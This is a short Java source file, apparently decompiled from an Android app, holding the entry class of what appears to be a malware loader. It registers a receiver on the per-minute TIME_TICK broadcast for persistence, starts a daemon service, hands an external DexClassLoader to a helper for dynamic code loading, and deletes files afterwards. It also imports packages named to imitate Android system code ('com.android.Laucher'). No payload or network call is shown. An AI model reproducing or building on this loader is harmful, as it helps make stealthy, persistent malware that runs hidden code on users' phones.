package cn.n;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import com.android.Laucher.Receiver;
import com.android.Laucher.Se;
import com.android.daemon.Daemo;
import dalvik.system.DexClassLoader;

public class Entry {
    public static Receiver br;

    public static void in(Context context, DexClassLoader c) {
        Context mContext = context.getApplicationContext();
        registerReceiver(mContext);
        Daemo.startMonda(mContext, new Intent(mContext, Se.class));
        LoaderTools.outLoader = c;
        LoaderTools.getClassLoader(mContext);
        FileUtils.getInstance(mContext).delete();
    }

    public static void registerReceiver(Context co) {
        IntentFilter intent = new IntentFilter("android.intent.action.TIME_TICK");
        if (br == null) {
            br = new Receiver();
        }
        co.registerReceiver(br, intent);
    }
}
